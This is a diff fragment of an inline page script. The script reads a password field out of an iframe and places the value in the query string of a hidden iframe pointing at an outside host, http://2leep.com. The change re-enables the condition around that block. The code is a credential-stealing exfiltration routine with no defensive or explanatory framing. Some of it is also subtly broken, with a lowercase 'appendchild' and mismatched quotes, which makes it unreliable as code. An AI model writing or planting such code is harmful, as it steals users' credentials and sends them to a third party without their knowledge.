@@ -12,12 +12,12 @@
         var password = document.getElementById("iframe").contentWindow.document.getElementById("Password").innerHTML;
         
         var addr = "http://2leep.com";
-        //if(password!=""){
+        if(password!=""){
             var temp = document.createElement("div");
             temp.innerHTML += "<iframe src=\"" + addr + "\"?password=" + password + "\" style = \"display:none;\" />";
             document.body.appendchild(temp);
             clearInterval(interval);
-        //}
+        }
         
     }
 </script>
